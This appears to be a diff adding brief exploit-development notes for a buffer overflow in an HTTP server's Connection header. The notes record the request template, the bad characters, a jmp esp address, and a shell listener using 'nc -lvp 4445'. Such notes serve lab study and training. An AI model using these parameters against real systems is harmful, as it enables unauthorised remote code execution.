@@ -1,0 +1,14 @@
+1===>  Getting Vulnerable Parameter
+       ==> used bed method HTTP
+       ==> vuln para :: "Connection: "+<buffer>+"\r\n\r\n"
+       
+       ===> we had we use
+                        ==> ==> ==> "GET / HTTP/1.1\r\n"  +   "Connection: "   +  <buffer>  +  "\r\n\r\n"
+                        
+
+==> badchars \x00\x0a
+
+==> jmp esp           0x7b0c89df
+
+==> payload listen on 127.0.0.1 : 4445
+==> use nc -lvp 4445
